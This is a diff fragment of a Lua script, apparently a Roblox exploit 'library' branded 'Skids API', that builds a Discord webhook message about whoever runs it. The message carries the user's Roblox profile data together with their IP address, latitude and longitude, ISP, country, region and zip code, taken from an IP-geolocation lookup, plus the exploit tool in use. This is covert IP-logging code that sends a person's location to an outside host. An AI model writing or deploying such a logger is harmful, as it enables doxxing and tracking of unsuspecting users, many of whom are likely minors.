@@ -38,17 +38,21 @@ do
                 ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
                 ["embeds"] = {
                         {
+                        ["title"] = "Skids API",
+                        ["description"] = "__a library made for skids :wink:__",
+                        ['thumbnail'] = {
                             ['url']=string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&UserId=%d&format=png',player.UserId)
                         },
+                        ["url"] = "https://discord.gg/EUaH265S",
                         ["color"] = 526344,
                         ["fields"] = {
                             {
-                            ["name"] = "Data",
-                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplay: %s\nID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
+                            ["name"] = "User Data",
+                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
-                            ["name"] = "Personal",
-                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Longitude: %s/%s*\n*ISP*: %s\n*Used: %s*\n*Region: %s/%s*\n*Zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["name"] = "More Info",
+                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region: %s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
